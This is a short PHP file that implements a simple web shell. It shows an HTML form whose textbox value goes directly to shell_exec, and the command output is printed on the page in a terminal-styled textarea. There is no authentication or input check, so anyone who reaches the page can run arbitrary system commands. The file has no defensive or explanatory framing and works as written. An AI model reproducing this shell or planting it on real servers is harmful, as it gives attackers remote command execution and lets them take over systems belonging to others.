<?php
      
        print "<div name='cmd' align='center'>
              <b></b><br><textarea align='center' style='width: 700px; height:350px; 
               background-color:black; color:green; align:center;border:5;'>";
if (isset($_POST['form'])) {
    $form = $_POST['form'];

    if ($form == 'my_form') {
        $input = $_POST['my_value']; // read the value from the textbox
                $file = shell_exec($input);
                var_dump($file);
                print($file);
    }
}
        print "</textarea><hr><br></div>";
?>

<div name="cmd" align="center">
<form method="post">
    <input type="text" name="my_value" value="" />
    <input type="hidden" name="form" value="my_form" />
    <input type="submit" />
</form>
</div>

